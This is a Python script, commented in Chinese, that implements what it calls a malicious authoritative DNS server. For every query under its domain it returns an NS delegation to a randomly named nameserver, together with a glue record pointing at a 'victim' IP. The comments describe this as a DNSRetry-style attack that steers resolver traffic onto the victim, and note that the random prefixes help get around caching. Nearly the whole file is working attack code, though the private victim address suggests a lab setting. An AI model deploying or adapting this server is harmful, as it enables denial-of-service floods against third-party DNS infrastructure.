import time
import random
from dnslib import DNSHeader, RR, A, NS, QTYPE, DNSLabel
from dnslib.server import DNSServer

# --- 配置项 ---
MY_DOMAIN = "example.com"      # 我们控制的域名
VICTIM_IP = "10.5.0.4"         # DNSRetry攻击中的受害者IP
# 如果用于DNSLOOP/CHAIN，这里会是一个字典，但现在先用单个IP
# VICTIM_NS_NAME = "ns.victim.example.com" # 为受害者捏造一个NS域名
MY_IP = "0.0.0.0"              # 服务器监听的IP地址
PORT = 53                      # DNS服务端口

class MaliciousNSServer:
    """
    一个恶意的权威DNS服务器。
    当收到任何针对其控制域名(MY_DOMAIN)的查询时，
    它都会返回一个NS记录，将解析责任推给受害者(VICTIM_IP)，
    并提供指向受害者的胶水记录(Glue Record)。
    """
    
    def resolve(self, request, handler):
        """
        处理DNS请求的核心逻辑。
        """
        qname = request.q.qname
        qtype = QTYPE[request.q.qtype]
        client_ip = handler.client_address[0]

        print(f"[+] Received query for: {qname} (Type: {qtype}) from {client_ip}")

        # 检查查询是否是针对我们控制的域名或其子域名
        if qname.matchSuffix(DNSLabel(MY_DOMAIN)):
            
            # 创建应答包
            reply = request.reply()

            # 无论客户端问什么（A, AAAA, MX等），我们都只回答NS记录
            # 这模拟了一个上级域的行为
            
            # 1. 构造一个虚假的NS域名，让它看起来更真实
            #    每次查询都用一个随机前缀，可以部分绕过某些缓存策略
            random_prefix = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
            victim_ns_name = f"ns-{random_prefix}.victim.{MY_DOMAIN}"

            print(f"[*] Query matches our domain. Delegating to victim NS: {victim_ns_name} at {VICTIM_IP}")

            # 2. 【关键】添加NS记录到“权威”部分(Authority Section)
            #    告诉客户端，qname的权威服务器是 victim_ns_name
            reply.add_auth(RR(qname, QTYPE.NS, rdata=NS(victim_ns_name), ttl=60))

            # 3. 【关键】添加胶水记录(Glue Record)到“附加”部分(Additional Section)
            #    为了防止客户端再去查询 victim_ns_name 的IP地址（这会产生额外流量），
            #    我们“贴心”地直接告诉它 victim_ns_name 的IP就是受害者的IP。
            reply.add_ar(RR(victim_ns_name, QTYPE.A, rdata=A(VICTIM_IP), ttl=60))

            return reply

        # 对于所有其他不匹配的查询（例如查询google.com）
        # 我们可以返回一个REFUSED错误码，表明我们不为该域服务
        else:
            print(f"[-] Query for {qname} is not for our domain. Refusing.")
            reply = request.reply()
            reply.header.rcode = 2 # RCODE 2 = SERVFAIL, 5 = REFUSED. REFUSED更合适
            return reply

# --- 主程序入口 ---
if __name__ == '__main__':
    resolver = MaliciousNSServer()
    server = DNSServer(resolver, port=PORT, address=MY_IP)

    print(f"[*] Starting Malicious NS Server for *.{MY_DOMAIN}")
    print(f"[*] Any query will be delegated to victim at {VICTIM_IP}")
    print(f"[*] Listening on {MY_IP}:{PORT}")
    
    try:
        server.start()
    except KeyboardInterrupt:
        print("\n[*] Server shutting down.")
        server.stop()